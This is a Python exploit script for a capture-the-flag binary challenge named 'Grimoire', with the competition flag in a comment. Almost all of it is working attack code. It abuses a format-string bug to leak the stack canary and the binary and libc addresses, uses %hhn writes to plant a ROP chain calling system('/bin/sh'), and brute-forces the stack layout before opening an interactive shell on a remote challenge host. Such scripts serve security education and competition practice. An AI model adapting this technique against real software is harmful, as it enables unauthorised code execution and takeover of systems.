#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':'c\n'}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'13.231.207.73', 'port':9008})
env.select()

#==========

binf = ELF(bin_file)
offset_str_nofile   = next(binf.search(b'No such file or directory'))

libc = binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    gr = Grimoire(conn)

    gr.open()
    gr.read()

    exploit  = p64(0) + p64(1) + p64(0)*2
    exploit += b'%1$lx %3$lx %10$lx %11$lx %22$lx\x00'
    gr.edit(0x200, exploit)

    gr.open()

    leaks = list(map(lambda x : int(x, 16), conn.recvuntil(': No', drop=True).split()))
    addr_str_nofile = leaks[1]
    addr_libc_main  = leaks[4] - 231
    # addr_heap_base  = leaks[0] - 0x16d0
    addr_stack      = leaks[3]
    canary          = leaks[2]

    binf.address = addr_str_nofile - offset_str_nofile
    info('addr_binf_base    = 0x{:08x}'.format(binf.address))

    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    # info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))
    info('addr_stack        = 0x{:08x}'.format(addr_stack))
    if addr_stack & 0xff > 0xc0:
        raise
    info('canary            = 0x{:08x}'.format(canary))

    rop = ROP(binf)
    rop.call(addr_libc_system, [addr_libc_str_sh])

    exploit = bytes(rop)
    for i in range(len(exploit)-1, -1, -1):
        fsb_setval(gr, addr_stack+0x20 + i, exploit[i])

    exploit = p64(canary)
    for i in range(len(exploit)-1, -1, -1):
        fsb_setval(gr, addr_stack+0x10 + i, exploit[i])

    fsb_setval(gr, addr_stack-0x20, addr_stack+0x18)

def fsb_setval(gr, addr, val):
    exploit  = p64(0) + p64(1) + p64(0)*2
    exploit += '%{}c%11$hhn\x00'.format(addr & 0xff).encode('utf8')
    gr.edit(0x200, exploit)
    gr.open()

    exploit  = p64(0) + p64(1) + p64(0)*2
    exploit += '%{}c%17$hhn\x00'.format(0x100 if val == 0 else (val & 0xff)).encode('utf8')
    gr.edit(0x200, exploit)
    gr.open()

class Grimoire:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def open(self):
        self.sendlineafter('> ', '1')

    def read(self):
        self.sendlineafter('> ', '2')
        self.recvuntil('----*\n')
        return self.recvuntil('*----', drop=True)

    def edit(self, ofs, txt):
        self.sendlineafter('> ', '3')
        self.sendlineafter('Offset: ', str(ofs))
        self.sendafter('Text: ', txt)

    def close(self):
        self.sendlineafter('> ', '4')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()
    # zer0pts{l0g1c4l_pwn_15_4_l0t_0f_fun}

if __name__=='__main__':
    main()

#==========
